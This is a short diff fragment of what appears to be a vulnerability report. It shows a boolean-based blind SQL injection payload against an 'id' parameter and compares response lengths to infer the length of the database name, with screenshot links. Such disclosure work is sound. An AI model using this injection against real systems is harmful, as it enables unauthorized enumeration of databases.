@@ -32,8 +32,8 @@ id=11' and length(database()) =6 --+ // Leak place ---> id
 
 
 When length (database ()) = 6, Content-Length: 19
-
-When length (database ()) = 7, Content-Length: 25112
-
+![image](https://user-images.githubusercontent.com/54017627/164883597-52bd6fd1-4ca5-492b-b1ad-8154f9d00a6a.png)
 
 
+When length (database ()) = 7, Content-Length: 168
+![image](https://user-images.githubusercontent.com/54017627/164883606-fe9eabca-396b-4fea-a2ee-99f68a2f064c.png)
